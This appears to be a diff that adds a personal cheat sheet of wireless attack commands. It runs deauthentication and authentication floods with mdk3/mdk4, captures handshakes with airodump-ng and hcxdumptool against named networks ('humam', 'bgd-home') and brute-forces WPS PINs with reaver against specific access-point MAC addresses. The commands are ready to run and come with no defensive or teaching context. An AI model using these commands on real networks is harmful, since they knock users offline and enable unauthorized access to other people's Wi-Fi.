@@ -1,0 +1,43 @@
+sudo airmon-ng start wlan1
+
+mdk4 [Interface Name] [Attack Mode] -c [Channel Number]}
+
+sudo mdk3 wlan1mon d -c 9
+
+sudo mdk3 wlan1mon d -c 11 -b block
+
+sudo mdk4 wlan1mon d -c 9
+
+mdk3 wlan1mon d -s 3 -c 9
+
+sudo mdk3 wlan1mon a -a 00:27:22:E4:9B:5A -m
+sudo mdk3 wlan1mon m -t E4:35:C8:F9:AF:88
+
+sudo airodump-ng wlan1mon -d E4:35:C8:F9:AF:88 -c 9
+sudo airodump-ng wlan1mon -d 00:27:22:E4:9B:5A -c 11
+
+
+sudo airodump-ng wlan1mon -c 9 -w ~/cap/bgd-home.cap
+sudo airodump-ng wlan1mon -d E4:35:C8:F9:AF:88 -c 9 -w ~/cap/bgd-home.cap
+sudo airodump-ng wlan1mon -c 11 -N humam -w ~/cap/humam.cap
+sudo airodump-ng wlan1mon -d 00:27:22:E4:9B:5A -c 11 -w ~/cap/humam.cap
+
+sudo ./hcxdumptool -i wlan1 --do_rcascan
+sudo ./hcxdumptool -o humam.cap -i wlan1 --enable_status=15 --filterlist=humam --filtermode=2 -c 11
+sudo ./hcxdumptool -o bgh-home.cap -i wlan1 --enable_status=15 --filterlist=bgh-home --filtermode=2 -c 9
+
+
+sudo mdk4 wlan1mon d -c 11 -b ~/block
+sudo mdk4 wlan1mon d -c 9 -b ~/block
+
+
+
+sudo reaver -i interface -b MAC_Address_AP
+
+sudo reaver -i wlan1mon -b B0:95:75:F0:A8:8E -vv
+sudo reaver -i wlan1mon -b 5C:A6:E6:3E:85:36 -vv -L 
+sudo reaver -i wlan1mon -b E4:C3:2A:7E:EF:8B -vv -L -N -d 15 -T .5 -r 3:20
+sudo reaver -i wlan1mon -b 84:D8:1B:C8:2D:86 -p 32681895 -vv
+
+
+reaver -i mon0 -c -b 00:23:69:12:34:56  -vv -L -N -d 15 -T .5 -r 3:15
